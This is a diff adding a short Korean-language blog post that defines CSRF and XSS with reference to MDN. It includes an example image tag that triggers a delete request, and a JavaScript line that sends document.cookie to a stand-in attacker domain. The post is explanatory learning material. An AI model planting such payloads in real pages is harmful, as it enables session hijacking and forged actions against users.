@@ -1,0 +1,35 @@
+---
+layout: post
+title:  "Web Secure - Web Security"
+date:   2021-05-29
+last_modified_at: 2021-05-29
+categories: [Web Secure]
+tags: [Web Secure]
+---
+
+<br/>
+
+### CSRF
+
+신뢰할 수 있는 사용자를 가장하여 웹사이트에 원치 않는 명령을 보내는 공격.
+
+예를 들어, 다른 곳으로 이동한다고 되어있는 링크 뒤의 URL에 악성 매개 변수를 포함하여 이를 수행
+
+<img src="https://www.example.com/index.php?action=delete&id=123">
+
+<br/>
+
+### XSS
+
+쿠키는 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용된다.
+
+쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있다.
+
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+
+<br/>
+
+출처
+
+[https://developer.mozilla.org/en-US/docs/Glossary/CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)
+[https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
